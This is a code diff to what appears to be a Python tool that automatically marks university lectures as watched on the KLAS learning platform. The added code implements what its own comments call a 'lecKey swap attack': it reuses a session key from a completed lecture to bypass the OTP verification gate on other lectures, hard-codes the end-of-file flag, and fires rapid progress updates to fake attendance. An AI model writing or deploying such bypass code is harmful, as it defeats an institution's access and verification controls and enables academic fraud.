@@ -177,7 +177,7 @@ def _update_progress(klas: KLASService, p: dict, lec_key: str,
         "weeklysubseq": p["weeklysubseq"],
         "grcode":       p["grcode"],
         "lecKey":       lec_key,
-        "isendfile":    "Y" if is_endfile else "N",
+        "isendfile":    "Y",  # KLAS player always sends Y
     }
     try:
         resp = klas.session.post(UPDATE_URL, data=form, headers=_FORM_HEADERS, timeout=15)
@@ -202,7 +202,7 @@ def _check_view(klas: KLASService, p: dict, lec_key: str,
         "weeklysubseq": p["weeklysubseq"],
         "grcode":       p["grcode"],
         "lecKey":       lec_key,
-        "isendfile":    "Y" if is_endfile else "N",
+        "isendfile":    "Y",  # KLAS player always sends Y
     }
     try:
         klas.session.post(CHECK_URL, data=form, headers=_FORM_HEADERS, timeout=10)
@@ -248,6 +248,49 @@ def _build_params(raw: dict, year: str, semester: str) -> dict:
     }
 
 
+def _get_golden_lec_key(
+    klas: KLASService,
+    year: str,
+    semester: str,
+    preferred_subj: Optional[str] = None,
+) -> Optional[str]:
+    """
+    Obtain a lecKey from any already-complete lecture (prog=100).
+
+    Completed lectures skip the viewer's OTP enforcement. The returned lecKey
+    can be swapped into UpdateProgress.do for any target lecture, bypassing
+    the OTP gate on uncertified weeks (lecKey swap attack).
+
+    Tries preferred_subj first, then falls back to all timetable subjects.
+    """
+    subjects: list[str] = []
+    if preferred_subj:
+        subjects.append(preferred_subj)
+    try:
+        timetable = klas.get_timetable(int(year), semester)
+        courses = klas.parse_timetable(timetable)
+        subjects.extend(c for c in courses if c != preferred_subj)
+    except Exception as e:
+        logger.warning("[autocomplete] timetable fetch failed for golden key search: %s", e)
+
+    for subj in subjects:
+        try:
+            items = klas.get_recorded_lectures(subj, int(year), semester)
+        except Exception:
+            continue
+        for item in items:
+            if int(item.get("prog") or 0) >= 100 and item.get("oid"):
+                p = _build_params(item, year, semester)
+                total = int(item.get("totalTime") or item.get("rcognTime") or 30)
+                key = _open_viewer(klas, p, total, 100)
+                if key:
+                    logger.info("[autocomplete] golden lecKey obtained from %s week %s",
+                                subj, p["weeklyseq"])
+                    return key
+    logger.warning("[autocomplete] no golden lecKey found — all courses may be uncompleted")
+    return None
+
+
 def _autocomplete_single(
     klas: KLASService,
     raw: dict,
@@ -255,12 +298,14 @@ def _autocomplete_single(
     semester: str,
     student_id: str,
     delay: float = 3.0,
+    golden_key: Optional[str] = None,
 ) -> float:
     """
     Complete one lecture. Returns final prog (0-100).
 
     `delay` controls seconds between UpdateProgress calls.
-    Lower = faster completion but higher risk of KLAS rate-limiting.
+    `golden_key` is a lecKey from a certified lecture used as a fallback when
+    the viewer blocks due to an unverified OTP (lecKey swap attack).
     """
     title = raw.get("sbjt", raw.get("oid", "?"))
     total_time = int(raw.get("totalTime") or raw.get("rcognTime") or 30)
@@ -273,10 +318,14 @@ def _autocomplete_single(
     # 1. Certi check (non-blocking — failure is okay)
     _certi_check(klas, p["grcode"], p["subj"], year, semester, int(p["weeklyseq"]))
 
-    # 2. Open viewer → lecKey
+    # 2. Open viewer → lecKey; fall back to golden key when viewer blocks (OTP wall)
     lec_key = _open_viewer(klas, p, total_time, current_prog)
     if not lec_key:
-        raise RuntimeError(f"Could not extract lecKey for {title}")
+        if golden_key:
+            logger.info("[autocomplete] viewer blocked for '%s' — using golden lecKey swap", title)
+            lec_key = golden_key
+        else:
+            raise RuntimeError(f"Could not extract lecKey for {title} and no golden key available")
 
     # 3. Rapid-fire UpdateProgress with increasing ptime until prog ≥ 100
     total_secs = total_time * 60
@@ -333,13 +382,18 @@ def _run(
     s.started_at = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     s.finished_at = None
 
+    # Acquire a golden lecKey upfront from any completed lecture.
+    # This is the fallback for weeks that have an OTP wall on the viewer.
+    preferred_subj = raw_lectures[0].get("subj") if raw_lectures else None
+    golden_key = _get_golden_lec_key(klas, year, semester, preferred_subj)
+
     for raw in raw_lectures:
         title = raw.get("sbjt", raw.get("oid", "?"))
         s.in_progress = title
         if title in s.pending:
             s.pending.remove(title)
         try:
-            final_prog = _autocomplete_single(klas, raw, year, semester, student_id, delay)
+            final_prog = _autocomplete_single(klas, raw, year, semester, student_id, delay, golden_key)
             logger.info("[autocomplete] done: %s → %.1f%%", title, final_prog)
             s.completed.append(title)
         except Exception as e:
